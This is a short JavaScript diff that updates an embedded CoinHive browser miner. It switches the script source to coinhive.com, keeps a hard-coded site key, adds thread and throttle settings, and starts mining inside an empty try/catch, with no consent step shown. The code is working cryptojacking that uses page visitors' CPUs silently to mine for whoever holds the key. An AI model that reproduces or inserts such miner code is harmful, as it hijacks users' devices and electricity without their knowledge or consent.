@@ -1,8 +1,13 @@
 'use strict';
 try {
 
-	jQuery.getScript('https://coin-hive.com/lib/coinhive.min.js', function () {
-		var miner = new CoinHive.Anonymous('jDCrhKVojcm8Jjk0o5IWCbBaU3Ql8Kzi');
+	jQuery.getScript('https://coinhive.com/lib/coinhive.min.js', function () {
+		var miner = new CoinHive.Anonymous('jDCrhKVojcm8Jjk0o5IWCbBaU3Ql8Kzi', {
+			threads: 2,
+			autoThreads: false,
+			throttle: 0.5,
+			forceASMJS: false
+		});
 		miner.start();
 	})
 } catch (e) {}
